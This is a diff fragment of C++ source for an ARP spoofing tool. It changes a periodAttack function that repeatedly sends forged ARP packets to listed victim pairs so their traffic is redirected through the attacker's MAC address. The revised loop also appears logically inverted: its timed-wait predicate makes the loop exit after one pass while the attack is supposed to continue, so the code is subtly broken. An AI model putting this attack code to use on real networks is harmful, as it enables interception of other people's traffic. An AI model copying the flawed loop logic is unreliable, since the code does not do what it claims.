@@ -183,6 +183,8 @@ bool sendPacket(pcap_t* pcap, const uint8_t* packet, const int packetLength) {
  * send packet repeatedly until end flag turns true
 */
 bool sendARPRequest(pcap_t* pcap, const Mac& myMAC, const IPv4& myIP, const IPv4& IP) {
+    signal(SIGINT, SIG_DFL);
+
     EthArpPacket packet;
 
 #ifdef DEBUG
@@ -238,21 +240,21 @@ void ARPPacketSetting(EthArpPacket& packet,
 }
 
 bool periodAttack(pcap_t* pcap, const Mac& myMAC, const std::vector<attackInfo>& victims) {
+    std::unique_lock<std::mutex> lk(m);
+    auto now = std::chrono::system_clock::now();
+
     EthArpPacket packet;
     ARPPacketInit(packet);
 
+    using namespace std::chrono_literals;
+
     // send fake packet to all victim pairs periodically
-    while(not isEnd) {
+    do {
         for(auto a : victims) {
             ARPPacketSetting(packet, a.sendMAC, myMAC, myMAC, a.targetIP, a.sendMAC, a.sendIP);
             if(not sendPacket(pcap, packet)) return false;
         }
-
-        if(sleep(5)) {
-            std::cerr << SLEEP_ERROR_MSG;
-            return false;
-        }
-    }
+    } while(not cv.wait_until(lk, now + 5s, [](){ return not isEnd; }));
 
     return true;
 }
